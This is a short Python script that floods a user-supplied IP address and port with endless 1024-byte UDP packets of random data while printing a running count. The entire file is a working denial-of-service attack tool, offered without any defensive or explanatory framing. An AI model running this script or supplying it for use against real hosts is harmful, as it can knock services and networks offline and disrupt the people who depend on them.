import socket
import random

sock = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
bytes = random._urandom(1024)
ip = input('Target IP: ')
port = int(input('Port: '))
sent = 1

while True:
    sock.sendto(bytes,(ip,port))
    print ("Sent %s amount of packets to %s at port %s." % (sent,ip,port))
    sent += 1
